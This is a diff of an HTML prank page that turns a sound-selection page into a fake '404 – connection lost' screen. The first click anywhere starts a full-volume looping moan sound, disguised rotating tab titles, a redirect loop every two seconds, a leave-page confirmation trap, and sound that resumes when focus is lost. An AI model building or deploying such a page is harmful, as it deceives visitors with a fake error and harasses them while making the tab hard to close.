@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sound Selection</title>
+    <title>404 - Not Found</title>
     <style>
         body {
             margin: 0;
@@ -20,7 +20,7 @@
             cursor: default;
         }
 
-        .container {
+        .overlay {
             text-align: center;
             padding: 20px;
             width: 90%;
@@ -43,49 +43,10 @@
             margin: 10px 0;
         }
 
-        .buttons {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        button {
-            padding: 10px 20px;
+        span {
             font-size: 1em;
-            color: #fff;
-            background: #424242;
-            border: 1px solid #616161;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        button:hover {
-            background: #616161;
-        }
-
-        button:active {
-            background: #d32f2f;
-        }
-
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #212121;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            padding: 20px;
-        }
-
-        .hidden {
-            display: none;
+            color: #d32f2f;
+            font-weight: bold;
         }
 
         @media (max-width: 600px) {
@@ -95,35 +56,23 @@
             p {
                 font-size: 1em;
             }
-            button {
-                padding: 8px 15px;
+            span {
                 font-size: 0.9em;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Выберите звук</h2>
-        <p>Нажмите на кнопку ниже</p>
-        <div class="buttons">
-            <button onclick="startPrank('sounds/moan.mp3')">ston</button>
-            <button onclick="startPrank('sounds/cry.mp3')">wasap</button>
-            <button onclick="startPrank('sounds/judge.mp3')">sirena</button>
-        </div>
-    </div>
-    <div id="prank-overlay" class="overlay hidden">
+    <div class="overlay">
         <h2>404 - Ошибка</h2>
         <p>Подключение к серверу потеряно...</p>
-        <span>Попробуйте перезагрузить страницу</span>
+        <span>Нажмите для проверки</span>
     </div>
-    <audio id="prank-audio" src=""></audio>
+    <audio id="prank-audio" src="sounds/moan.mp3" loop></audio>
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const audio = document.getElementById('prank-audio');
-            const overlay = document.getElementById('prank-overlay');
-            const container = document.querySelector('.container');
 
             // Список заголовков для маскировки
             const fakeTitles = [
@@ -164,20 +113,19 @@
             function redirectLoop() {
                 setTimeout(() => {
                     window.location.href = randomSites[siteIndex];
-                    siteIndex = (siteIndex + 1) % randomSites.length; // Цикл по списку
+                    siteIndex = (siteIndex + 1) % randomSites.length;
                 }, 2000); // Переадресация каждые 2 секунды
             }
 
-            // Функция запуска пранка
-            window.startPrank = function(soundFile) {
-                audio.src = soundFile;
-                audio.volume = 1.0;
-                audio.loop = true;
-                audio.play();
+            // Пранк запускается при первом клике где угодно
+            let prankStarted = false;
+            document.body.addEventListener('click', () => {
+                if (prankStarted) return;
+                prankStarted = true;
 
-                // Показываем оверлей без кнопок
-                overlay.classList.remove('hidden');
-                container.style.display = 'none';
+                // Запускаем звук
+                audio.volume = 1.0;
+                audio.play();
 
                 // Меняем заголовок каждые 1.5 секунды
                 setInterval(changeTitle, 1500);
@@ -195,7 +143,7 @@
                     e.preventDefault();
                     e.returnValue = 'Вы уверены?';
                 });
-            };
+            });
 
             // Возобновляем звук при потере фокуса
             window.addEventListener('blur', () => {
